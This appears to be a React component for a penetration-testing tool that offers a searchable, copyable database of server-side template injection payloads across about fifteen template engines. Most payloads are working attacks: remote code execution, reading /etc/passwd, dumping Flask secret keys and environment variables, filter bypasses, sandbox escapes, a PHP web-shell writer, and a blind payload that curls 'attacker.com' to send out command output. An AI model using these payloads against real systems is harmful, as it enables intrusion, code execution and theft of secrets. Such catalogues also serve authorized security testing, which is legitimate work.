import React, { useState, useMemo } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faCopy, faCheck, faFilter, faSearch, faCode, faExclamationTriangle } from '@fortawesome/free-solid-svg-icons';
import type { SstiPayloadGeneratorData, SstiTemplateEngine, SstiPayloadCategory } from './tool-types';

type Props = {
  data: SstiPayloadGeneratorData | undefined;
  onChange: (data: SstiPayloadGeneratorData) => void;
};

type PayloadEntry = {
  name: string;
  payload: string;
  engine: SstiTemplateEngine;
  category: SstiPayloadCategory;
  description: string;
  expectedOutput?: string;
};

// Comprehensive SSTI payload database
const SSTI_PAYLOADS: PayloadEntry[] = [
  // === Detection Payloads ===
  // Generic
  { name: 'Math detection', payload: '{{7*7}}', engine: 'generic', category: 'detection', description: 'Basic math evaluation - expect 49', expectedOutput: '49' },
  { name: 'String concat', payload: '{{"foo"+"bar"}}', engine: 'generic', category: 'detection', description: 'String concatenation test', expectedOutput: 'foobar' },
  { name: 'ERB detection', payload: '<%= 7*7 %>', engine: 'erb', category: 'detection', description: 'Ruby ERB syntax', expectedOutput: '49' },

  // Jinja2/Python
  { name: 'Jinja2 basic', payload: '{{7*\'7\'}}', engine: 'jinja2', category: 'detection', description: 'Jinja2 string multiplication', expectedOutput: '7777777' },
  { name: 'Jinja2 class', payload: '{{"".__class__}}', engine: 'jinja2', category: 'detection', description: 'Access Python class', expectedOutput: '<class \'str\'>' },
  { name: 'Jinja2 config', payload: '{{config}}', engine: 'jinja2', category: 'detection', description: 'Flask config object', expectedOutput: 'Config object' },
  { name: 'Jinja2 request', payload: '{{request.application}}', engine: 'jinja2', category: 'detection', description: 'Flask request object' },

  // Twig/PHP
  { name: 'Twig basic', payload: '{{7*7}}', engine: 'twig', category: 'detection', description: 'Twig math evaluation', expectedOutput: '49' },
  { name: 'Twig id', payload: '{{_self}}', engine: 'twig', category: 'detection', description: 'Twig self reference' },
  { name: 'Twig env', payload: '{{_self.env}}', engine: 'twig', category: 'detection', description: 'Twig environment access' },

  // FreeMarker/Java
  { name: 'FreeMarker basic', payload: '${7*7}', engine: 'freemarker', category: 'detection', description: 'FreeMarker interpolation', expectedOutput: '49' },
  { name: 'FreeMarker class', payload: '${"freemarker.template.utility.Execute"?new()}', engine: 'freemarker', category: 'detection', description: 'FreeMarker class instantiation' },

  // Velocity/Java
  { name: 'Velocity basic', payload: '#set($x=7*7)$x', engine: 'velocity', category: 'detection', description: 'Velocity variable', expectedOutput: '49' },
  { name: 'Velocity class', payload: '$class.inspect("java.lang.Runtime")', engine: 'velocity', category: 'detection', description: 'Velocity class inspection' },

  // Smarty/PHP
  { name: 'Smarty basic', payload: '{$smarty.version}', engine: 'smarty', category: 'detection', description: 'Smarty version disclosure' },
  { name: 'Smarty math', payload: '{math equation="7*7"}', engine: 'smarty', category: 'detection', description: 'Smarty math function', expectedOutput: '49' },

  // Handlebars/JS
  { name: 'Handlebars basic', payload: '{{this}}', engine: 'handlebars', category: 'detection', description: 'Handlebars context' },
  { name: 'Handlebars proto', payload: '{{constructor.constructor}}', engine: 'handlebars', category: 'detection', description: 'Handlebars prototype access' },

  // EJS/JS
  { name: 'EJS basic', payload: '<%= 7*7 %>', engine: 'ejs', category: 'detection', description: 'EJS output tag', expectedOutput: '49' },
  { name: 'EJS process', payload: '<%= process.version %>', engine: 'ejs', category: 'detection', description: 'Node.js version' },

  // Pug/JS
  { name: 'Pug basic', payload: '#{7*7}', engine: 'pug', category: 'detection', description: 'Pug interpolation', expectedOutput: '49' },

  // Mako/Python
  { name: 'Mako basic', payload: '${7*7}', engine: 'mako', category: 'detection', description: 'Mako expression', expectedOutput: '49' },
  { name: 'Mako import', payload: '<%import os%>${os.popen("id").read()}', engine: 'mako', category: 'detection', description: 'Mako with import' },

  // Thymeleaf/Java
  { name: 'Thymeleaf basic', payload: '[[${7*7}]]', engine: 'thymeleaf', category: 'detection', description: 'Thymeleaf expression', expectedOutput: '49' },
  { name: 'Thymeleaf T()', payload: '${T(java.lang.Runtime)}', engine: 'thymeleaf', category: 'detection', description: 'Thymeleaf type access' },

  // === RCE Payloads ===
  // Jinja2 RCE
  { name: 'Jinja2 RCE v1', payload: '{{"".__class__.__mro__[2].__subclasses__()[40]("id").read()}}', engine: 'jinja2', category: 'rce', description: 'Python file read via subprocess' },
  { name: 'Jinja2 RCE v2', payload: '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}', engine: 'jinja2', category: 'rce', description: 'Flask config os access' },
  { name: 'Jinja2 RCE lipsum', payload: '{{lipsum.__globals__["os"].popen("id").read()}}', engine: 'jinja2', category: 'rce', description: 'Via lipsum filter' },
  { name: 'Jinja2 RCE cycler', payload: '{{cycler.__init__.__globals__.os.popen("id").read()}}', engine: 'jinja2', category: 'rce', description: 'Via cycler object' },
  { name: 'Jinja2 RCE joiner', payload: '{{joiner.__init__.__globals__.os.popen("id").read()}}', engine: 'jinja2', category: 'rce', description: 'Via joiner object' },
  { name: 'Jinja2 RCE namespace', payload: '{{namespace.__init__.__globals__.os.popen("id").read()}}', engine: 'jinja2', category: 'rce', description: 'Via namespace object' },

  // Twig RCE
  { name: 'Twig RCE filter', payload: '{{["id"]|filter("system")}}', engine: 'twig', category: 'rce', description: 'Twig filter function callback' },
  { name: 'Twig RCE map', payload: '{{["id"]|map("system")}}', engine: 'twig', category: 'rce', description: 'Twig map function callback' },
  { name: 'Twig RCE reduce', payload: '{{["id",""]|reduce("system")}}', engine: 'twig', category: 'rce', description: 'Twig reduce function callback' },
  { name: 'Twig RCE sort', payload: '{{["id",0]|sort("system")}}', engine: 'twig', category: 'rce', description: 'Twig sort function callback' },

  // FreeMarker RCE
  { name: 'FreeMarker RCE', payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', engine: 'freemarker', category: 'rce', description: 'FreeMarker Execute class' },
  { name: 'FreeMarker ObjectConstructor', payload: '<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>${oc("java.lang.ProcessBuilder",["id"]).start()}', engine: 'freemarker', category: 'rce', description: 'Via ObjectConstructor' },

  // Velocity RCE
  { name: 'Velocity RCE', payload: '#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")', engine: 'velocity', category: 'rce', description: 'Velocity reflection RCE' },
  { name: 'Velocity RCE v2', payload: '#set($x=\'\')#set($rt=$x.class.forName(\'java.lang.Runtime\'))#set($chr=$x.class.forName(\'java.lang.Character\'))#set($str=$x.class.forName(\'java.lang.String\'))#set($ex=$rt.getRuntime().exec(\'id\'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end', engine: 'velocity', category: 'rce', description: 'Velocity RCE with output' },

  // Smarty RCE
  { name: 'Smarty RCE', payload: '{system("id")}', engine: 'smarty', category: 'rce', description: 'Direct system call' },
  { name: 'Smarty RCE v2', payload: '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[\'c\']); ?>",self::clearConfig())}', engine: 'smarty', category: 'rce', description: 'Write PHP file' },

  // EJS RCE
  { name: 'EJS RCE', payload: '<%= require(\'child_process\').execSync(\'id\') %>', engine: 'ejs', category: 'rce', description: 'Node.js child_process' },
  { name: 'EJS RCE v2', payload: '<%= global.process.mainModule.require(\'child_process\').execSync(\'id\') %>', engine: 'ejs', category: 'rce', description: 'Via global.process' },

  // Pug RCE
  { name: 'Pug RCE', payload: '-var x = global.process.mainModule.require\n-x(\'child_process\').exec(\'id\')', engine: 'pug', category: 'rce', description: 'Pug child_process exec' },

  // Mako RCE
  { name: 'Mako RCE', payload: '<%\nimport os\nx=os.popen(\'id\').read()\n%>\n${x}', engine: 'mako', category: 'rce', description: 'Mako os.popen' },

  // Thymeleaf RCE
  { name: 'Thymeleaf RCE', payload: '${T(java.lang.Runtime).getRuntime().exec("id")}', engine: 'thymeleaf', category: 'rce', description: 'Thymeleaf Runtime exec' },
  { name: 'Thymeleaf RCE v2', payload: '__${T(java.lang.Runtime).getRuntime().exec("id")}__::x', engine: 'thymeleaf', category: 'rce', description: 'Thymeleaf preprocessing' },

  // ERB RCE
  { name: 'ERB RCE', payload: '<%= `id` %>', engine: 'erb', category: 'rce', description: 'Ruby backtick execution' },
  { name: 'ERB RCE v2', payload: '<%= system("id") %>', engine: 'erb', category: 'rce', description: 'Ruby system call' },
  { name: 'ERB RCE v3', payload: '<%= IO.popen("id").read %>', engine: 'erb', category: 'rce', description: 'Ruby IO.popen' },

  // Handlebars RCE (prototype pollution based)
  { name: 'Handlebars RCE', payload: '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}', engine: 'handlebars', category: 'rce', description: 'Handlebars RCE via prototype' },

  // Nunjucks RCE
  { name: 'Nunjucks RCE', payload: '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}', engine: 'nunjucks', category: 'rce', description: 'Nunjucks constructor execution' },

  // === File Read Payloads ===
  { name: 'Jinja2 file read', payload: '{{"".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}', engine: 'jinja2', category: 'file-read', description: 'Read /etc/passwd' },
  { name: 'Jinja2 file read v2', payload: '{{get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read()}}', engine: 'jinja2', category: 'file-read', description: 'Via get_flashed_messages' },
  { name: 'Twig file read', payload: '{{"/etc/passwd"|file_excerpt(1,-1)}}', engine: 'twig', category: 'file-read', description: 'Twig file_excerpt filter' },
  { name: 'EJS file read', payload: '<%= require(\'fs\').readFileSync(\'/etc/passwd\') %>', engine: 'ejs', category: 'file-read', description: 'Node.js fs.readFileSync' },
  { name: 'ERB file read', payload: '<%= File.read(\'/etc/passwd\') %>', engine: 'erb', category: 'file-read', description: 'Ruby File.read' },
  { name: 'Mako file read', payload: '${open("/etc/passwd").read()}', engine: 'mako', category: 'file-read', description: 'Python open().read()' },

  // === Info Disclosure ===
  { name: 'Jinja2 env vars', payload: '{{config.items()}}', engine: 'jinja2', category: 'info-disclosure', description: 'Dump Flask config' },
  { name: 'Jinja2 secret key', payload: '{{config.SECRET_KEY}}', engine: 'jinja2', category: 'info-disclosure', description: 'Get Flask secret key' },
  { name: 'EJS env vars', payload: '<%= JSON.stringify(process.env) %>', engine: 'ejs', category: 'info-disclosure', description: 'Node.js environment' },
  { name: 'Thymeleaf server info', payload: '${#servletContext.serverInfo}', engine: 'thymeleaf', category: 'info-disclosure', description: 'Get server info' },
  { name: 'FreeMarker system props', payload: '${.getSystemProperty("user.dir")}', engine: 'freemarker', category: 'info-disclosure', description: 'Get current directory' },

  // === Bypass Payloads ===
  { name: 'Jinja2 no underscore', payload: '{{()|attr("\\x5f\\x5fclass\\x5f\\x5f")}}', engine: 'jinja2', category: 'bypass', description: 'Hex encoding underscore' },
  { name: 'Jinja2 no brackets', payload: '{{request|attr("application")|attr("\\x5f\\x5fglobals\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fbuiltins\\x5f\\x5f")|attr("\\x5f\\x5fgetitem\\x5f\\x5f")("\\x5f\\x5fimport\\x5f\\x5f")("os")|attr("popen")("id")|attr("read")()}}', engine: 'jinja2', category: 'bypass', description: 'No brackets using attr()' },
  { name: 'Jinja2 no quotes', payload: '{{(lipsum|string|list).pop(18)}}', engine: 'jinja2', category: 'bypass', description: 'Get underscore without quotes' },
  { name: 'Jinja2 filter bypass', payload: '{%set chr=lipsum|string|list%}{%set dot=chr.pop(9)%}{{dot}}', engine: 'jinja2', category: 'bypass', description: 'Character extraction' },
  { name: 'Twig filter bypass', payload: '{{7*7|e}}', engine: 'twig', category: 'bypass', description: 'Bypass with escape filter' },

  // === Blind SSTI ===
  { name: 'Jinja2 blind sleep', payload: '{{lipsum.__globals__["os"].popen("sleep 5").read()}}', engine: 'jinja2', category: 'blind', description: 'Time-based detection' },
  { name: 'Jinja2 blind OOB', payload: '{{lipsum.__globals__["os"].popen("curl http://attacker.com/?x=$(id)").read()}}', engine: 'jinja2', category: 'blind', description: 'Out-of-band exfiltration' },
  { name: 'EJS blind', payload: '<%= require(\'child_process\').execSync(\'sleep 5\') %>', engine: 'ejs', category: 'blind', description: 'Time-based EJS' },
  { name: 'Twig blind', payload: '{{["sleep 5"]|filter("system")}}', engine: 'twig', category: 'blind', description: 'Time-based Twig' },

  // === Sandbox Escape ===
  { name: 'Jinja2 sandbox escape v1', payload: '{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == \'catch_warnings\' %}{{ c.__init__.__globals__[\'__builtins__\'].eval("__import__(\'os\').popen(\'id\').read()") }}{% endif %}{% endfor %}', engine: 'jinja2', category: 'sandbox-escape', description: 'Via catch_warnings class' },
  { name: 'Jinja2 sandbox escape v2', payload: '{{().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(|attr(\'\\x5f\\x5fglobals\\x5f\\x5f\')|attr(\'\\x5f\\x5fgetitem\\x5f\\x5f\')(\'\\x5f\\x5fbuiltins\\x5f\\x5f\')|attr(\'\\x5f\\x5fgetitem\\x5f\\x5f\')(\'eval\')(\'__import__("os").popen("id").read()\')}}', engine: 'jinja2', category: 'sandbox-escape', description: 'MRO traversal escape' },
];

const ENGINE_LABELS: Record<SstiTemplateEngine, { label: string; lang: string; color: string }> = {
  jinja2: { label: 'Jinja2', lang: 'Python', color: 'bg-green-500/20 text-green-400 border-green-500/30' },
  twig: { label: 'Twig', lang: 'PHP', color: 'bg-purple-500/20 text-purple-400 border-purple-500/30' },
  freemarker: { label: 'FreeMarker', lang: 'Java', color: 'bg-orange-500/20 text-orange-400 border-orange-500/30' },
  velocity: { label: 'Velocity', lang: 'Java', color: 'bg-orange-500/20 text-orange-400 border-orange-500/30' },
  smarty: { label: 'Smarty', lang: 'PHP', color: 'bg-purple-500/20 text-purple-400 border-purple-500/30' },
  mako: { label: 'Mako', lang: 'Python', color: 'bg-green-500/20 text-green-400 border-green-500/30' },
  erb: { label: 'ERB', lang: 'Ruby', color: 'bg-red-500/20 text-red-400 border-red-500/30' },
  pebble: { label: 'Pebble', lang: 'Java', color: 'bg-orange-500/20 text-orange-400 border-orange-500/30' },
  thymeleaf: { label: 'Thymeleaf', lang: 'Java', color: 'bg-orange-500/20 text-orange-400 border-orange-500/30' },
  handlebars: { label: 'Handlebars', lang: 'JavaScript', color: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30' },
  ejs: { label: 'EJS', lang: 'JavaScript', color: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30' },
  pug: { label: 'Pug', lang: 'JavaScript', color: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30' },
  nunjucks: { label: 'Nunjucks', lang: 'JavaScript', color: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30' },
  blade: { label: 'Blade', lang: 'PHP', color: 'bg-purple-500/20 text-purple-400 border-purple-500/30' },
  generic: { label: 'Generic', lang: 'Multi', color: 'bg-blue-500/20 text-blue-400 border-blue-500/30' }
};

const CATEGORY_LABELS: Record<SstiPayloadCategory, { label: string; color: string }> = {
  detection: { label: 'Detection', color: 'bg-blue-500/20 text-blue-400' },
  rce: { label: 'RCE', color: 'bg-red-500/20 text-red-400' },
  'file-read': { label: 'File Read', color: 'bg-orange-500/20 text-orange-400' },
  'info-disclosure': { label: 'Info Leak', color: 'bg-yellow-500/20 text-yellow-400' },
  bypass: { label: 'Bypass', color: 'bg-purple-500/20 text-purple-400' },
  blind: { label: 'Blind', color: 'bg-cyan-500/20 text-cyan-400' },
  'sandbox-escape': { label: 'Sandbox', color: 'bg-pink-500/20 text-pink-400' }
};

const SstiPayloadGenerator: React.FC<Props> = ({ data, onChange }) => {
  const selectedEngine = data?.selectedEngine ?? 'all';
  const selectedCategory = data?.selectedCategory ?? 'all';
  const filterSearch = data?.filterSearch ?? '';
  const customCommand = data?.customCommand ?? 'id';
  const [copied, setCopied] = useState<string | null>(null);

  // Filter payloads
  const filteredPayloads = useMemo(() => {
    return SSTI_PAYLOADS.filter(p => {
      if (selectedEngine !== 'all' && p.engine !== selectedEngine) return false;
      if (selectedCategory !== 'all' && p.category !== selectedCategory) return false;
      if (filterSearch && !p.name.toLowerCase().includes(filterSearch.toLowerCase()) &&
          !p.payload.toLowerCase().includes(filterSearch.toLowerCase())) return false;
      return true;
    });
  }, [selectedEngine, selectedCategory, filterSearch]);

  const copyPayload = (payload: string) => {
    // Replace placeholder commands if custom command is set
    let finalPayload = payload;
    if (customCommand && customCommand !== 'id') {
      finalPayload = payload.replace(/('|")id('|")/g, `$1${customCommand}$2`);
      finalPayload = finalPayload.replace(/`id`/g, `\`${customCommand}\``);
      finalPayload = finalPayload.replace(/"id"/g, `"${customCommand}"`);
    }
    navigator.clipboard.writeText(finalPayload);
    setCopied(payload);
    setTimeout(() => setCopied(null), 2000);
  };

  const engineCounts = useMemo(() => {
    const counts: Record<string, number> = {};
    SSTI_PAYLOADS.forEach(p => {
      counts[p.engine] = (counts[p.engine] || 0) + 1;
    });
    return counts;
  }, []);

  const categoryCounts = useMemo(() => {
    const counts: Record<string, number> = {};
    SSTI_PAYLOADS.forEach(p => {
      counts[p.category] = (counts[p.category] || 0) + 1;
    });
    return counts;
  }, []);

  return (
    <div className="flex flex-col h-full text-xs">
      <div className="flex items-center justify-between mb-2">
        <div className="text-slate-200 font-medium">SSTI Payload Generator</div>
        <div className="text-[10px] text-slate-500">
          {filteredPayloads.length} / {SSTI_PAYLOADS.length} payloads
        </div>
      </div>

      <div className="text-[10px] text-slate-500 mb-2">
        Server-Side Template Injection payloads for 15 template engines
      </div>

      {/* Filters */}
      <div className="flex gap-2 mb-2">
        <div className="flex-1 rounded border border-slate-700 bg-slate-800/30 p-2">
          <div className="flex items-center gap-1 mb-1">
            <FontAwesomeIcon icon={faFilter} className="w-2.5 h-2.5 text-slate-500" />
            <label className="text-[9px] text-slate-500">Template Engine</label>
          </div>
          <select
            value={selectedEngine}
            onChange={(e) => onChange({ ...data, selectedEngine: e.target.value as SstiTemplateEngine | 'all' })}
            className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700"
          >
            <option value="all">All Engines ({SSTI_PAYLOADS.length})</option>
            {(Object.keys(ENGINE_LABELS) as SstiTemplateEngine[]).map(engine => (
              <option key={engine} value={engine}>
                {ENGINE_LABELS[engine].label} ({ENGINE_LABELS[engine].lang}) ({engineCounts[engine] || 0})
              </option>
            ))}
          </select>
        </div>
        <div className="flex-1 rounded border border-slate-700 bg-slate-800/30 p-2">
          <div className="flex items-center gap-1 mb-1">
            <FontAwesomeIcon icon={faCode} className="w-2.5 h-2.5 text-slate-500" />
            <label className="text-[9px] text-slate-500">Category</label>
          </div>
          <select
            value={selectedCategory}
            onChange={(e) => onChange({ ...data, selectedCategory: e.target.value as SstiPayloadCategory | 'all' })}
            className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700"
          >
            <option value="all">All Categories</option>
            {(Object.keys(CATEGORY_LABELS) as SstiPayloadCategory[]).map(cat => (
              <option key={cat} value={cat}>
                {CATEGORY_LABELS[cat].label} ({categoryCounts[cat] || 0})
              </option>
            ))}
          </select>
        </div>
      </div>

      {/* Search and Custom Command */}
      <div className="flex gap-2 mb-2">
        <div className="flex-1 rounded border border-slate-700 bg-slate-800/30 p-2">
          <div className="flex items-center gap-1 mb-1">
            <FontAwesomeIcon icon={faSearch} className="w-2.5 h-2.5 text-slate-500" />
            <label className="text-[9px] text-slate-500">Search</label>
          </div>
          <input
            type="text"
            value={filterSearch}
            onChange={(e) => onChange({ ...data, filterSearch: e.target.value })}
            placeholder="Search payloads..."
            className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-blue-500"
          />
        </div>
        <div className="w-32 rounded border border-slate-700 bg-slate-800/30 p-2">
          <label className="text-[9px] text-slate-500 block mb-1">Command</label>
          <input
            type="text"
            value={customCommand}
            onChange={(e) => onChange({ ...data, customCommand: e.target.value })}
            placeholder="id"
            className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700 font-mono focus:outline-none focus:border-blue-500"
          />
        </div>
      </div>

      {/* Payload List */}
      <div className="flex-1 overflow-y-auto space-y-1.5 min-h-0">
        {filteredPayloads.map((p, i) => (
          <div
            key={i}
            className="rounded border border-slate-700 bg-slate-800/30 p-2"
          >
            <div className="flex items-center justify-between mb-1">
              <div className="flex items-center gap-2">
                <span className={`text-[8px] px-1.5 py-0.5 rounded border ${ENGINE_LABELS[p.engine].color}`}>
                  {ENGINE_LABELS[p.engine].label}
                </span>
                <span className={`text-[8px] px-1.5 py-0.5 rounded ${CATEGORY_LABELS[p.category].color}`}>
                  {CATEGORY_LABELS[p.category].label}
                </span>
                <span className="text-slate-300 text-[10px]">{p.name}</span>
              </div>
              <button
                onClick={() => copyPayload(p.payload)}
                className="rounded bg-slate-800 px-2 py-0.5 text-[9px] text-slate-300 hover:bg-slate-700 transition-colors flex items-center gap-1"
              >
                <FontAwesomeIcon icon={copied === p.payload ? faCheck : faCopy} className="w-2 h-2" />
                {copied === p.payload ? 'Copied!' : 'Copy'}
              </button>
            </div>
            <div className="text-[9px] text-slate-500 mb-1">{p.description}</div>
            <pre className="text-[9px] text-slate-400 bg-slate-800/50 p-1.5 rounded font-mono overflow-x-auto whitespace-pre-wrap break-all">
              {p.payload}
            </pre>
            {p.expectedOutput && (
              <div className="text-[8px] text-green-400 mt-1">
                Expected: {p.expectedOutput}
              </div>
            )}
          </div>
        ))}
        {filteredPayloads.length === 0 && (
          <div className="text-center text-slate-500 text-[10px] py-8">
            No payloads match the current filters
          </div>
        )}
      </div>

      <div className="rounded border border-yellow-500/30 bg-yellow-900/20 p-2 mt-2 text-[9px] text-yellow-400">
        <FontAwesomeIcon icon={faExclamationTriangle} className="w-2.5 h-2.5 mr-1" />
        <strong>Warning:</strong> Authorized security testing only. SSTI can lead to RCE.
      </div>
    </div>
  );
};

export class SstiPayloadGeneratorTool {
  static Component = SstiPayloadGenerator;
}
